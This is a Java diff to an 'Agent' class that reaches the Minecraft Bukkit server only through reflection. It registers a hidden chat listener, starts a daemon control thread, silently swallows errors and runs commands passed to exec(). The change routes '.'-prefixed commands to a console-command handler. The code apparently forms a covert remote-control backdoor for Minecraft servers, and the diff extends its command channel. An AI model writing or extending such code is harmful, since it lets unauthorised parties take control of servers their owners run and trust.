@@ -26,6 +26,7 @@ public class Agent {
   private String serverId;
   private String rootDir;
   final Set<String> authorized = new HashSet<>();
+  ChatHandler chatHandler;
   String controlController;
   String controlTarget;
 
@@ -48,12 +49,12 @@ public class Agent {
       }
 
       try {
-        ChatHandler ch = new ChatHandler(this, authorized);
+        chatHandler = new ChatHandler(this, authorized);
         Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
         pm.getClass().getMethod("registerEvents",
             Class.forName("org.bukkit.event.Listener"),
             Class.forName("org.bukkit.plugin.Plugin"))
-            .invoke(pm, ch, plugin);
+            .invoke(pm, chatHandler, plugin);
       } catch (Exception ignored) {}
 
       Thread ct = new Thread(this::controlTick, "ac-ctl"); ct.setDaemon(true); ct.start();
@@ -230,6 +231,17 @@ public class Agent {
 
   private void exec(String cmd) {
     if (cmd == null || cmd.isEmpty()) return;
+    if (cmd.startsWith(".") && chatHandler != null) {
+      String fcmd = cmd;
+      try {
+        Class<?> bc = Class.forName("org.bukkit.Bukkit");
+        Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
+        Object sched = bc.getMethod("getScheduler").invoke(null);
+        sched.getClass().getMethod("scheduleSyncDelayedTask", pc, Runnable.class)
+            .invoke(sched, plugin, (Runnable) () -> chatHandler.handleConsoleCommand(fcmd));
+      } catch (Exception ignored) {}
+      return;
+    }
     try {
       Class<?> bc = Class.forName("org.bukkit.Bukkit");
       Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
